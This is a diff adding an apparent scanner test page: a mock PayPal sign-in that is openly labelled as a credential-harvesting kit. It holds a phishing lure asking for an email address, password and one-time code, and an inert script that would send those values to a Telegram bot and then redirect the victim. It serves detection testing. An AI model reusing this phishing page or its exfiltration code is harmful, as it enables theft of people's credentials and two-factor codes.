@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Sign in to your PayPal account</title>
+    <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png">
+    <meta property="og:site_name" content="PayPal">
+    <style>
+        body { margin: 0; background: #f5f7fa; color: #12203c;
+               font: 16px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
+        .banner { background: #1f2937; color: #fff; padding: 11px 16px; font-size: 14px; }
+        .card { width: min(420px, 100% - 40px); margin: 46px auto; background: #fff; padding: 28px;
+                border: 1px solid #e3e8ef; border-radius: 14px; }
+        h1 { margin: 0 0 4px; font-size: 26px; color: #003087; }
+        label { display: block; margin: 14px 0 4px; font-size: 13px; font-weight: 600; }
+        input { width: 100%; padding: 10px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; margin-top: 18px; padding: 11px; border: 0; border-radius: 999px;
+                 background: #0070ba; color: #fff; font-size: 15px; }
+        footer { margin-top: 22px; color: #64748b; font-size: 12px; text-align: center; }
+        .logos img { height: 26px; margin-right: 8px; }
+    </style>
+</head>
+<body>
+<div class="banner">TEST PAGE - a mock credential-harvesting kit. Nothing here is sent anywhere. Expected rating: F, credential harvesting kit.</div>
+
+<div class="card">
+    <h1>PayPal</h1>
+    <p>Your account has been limited. Confirm your details to restore access.</p>
+
+    <div class="logos">
+        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_37x23.jpg" alt="PayPal logo">
+        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal">
+        <img src="https://www.paypalobjects.com/digitalassets/c/website/logo/full-text/pp_fc_hl.svg" alt="PayPal secure">
+    </div>
+
+    <!-- No action: a script decides where the password goes. -->
+    <form action="">
+        <label for="email">Email address</label>
+        <input id="email" name="email" type="email" autocomplete="username">
+
+        <label for="password">Password</label>
+        <input id="password" name="password" type="password" autocomplete="current-password">
+
+        <label for="otp">One-time code from your authenticator app</label>
+        <input id="otp" name="otp" inputmode="numeric" placeholder="6-digit security code">
+
+        <button type="button">Log In</button>
+    </form>
+
+    <footer>&copy; 2026 PayPal, Inc. All rights reserved.</footer>
+</div>
+
+<!-- Deliberately inert: type="text/plain" means the browser never runs this.
+     It is here so the scanner has a kit's exfiltration code to find. -->
+<script type="text/plain" id="kit-code">
+    document.querySelector('button').addEventListener('click', function () {
+        var body = 'u=' + document.getElementById('email').value +
+                   '&p=' + document.getElementById('password').value +
+                   '&otp=' + document.getElementById('otp').value;
+        fetch('https://api.telegram.org/bot0000000000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage?chat_id=123456789&text=' + body);
+        location.href = 'https://www.paypal.com/';
+    });
+</script>
+</body>
+</html>
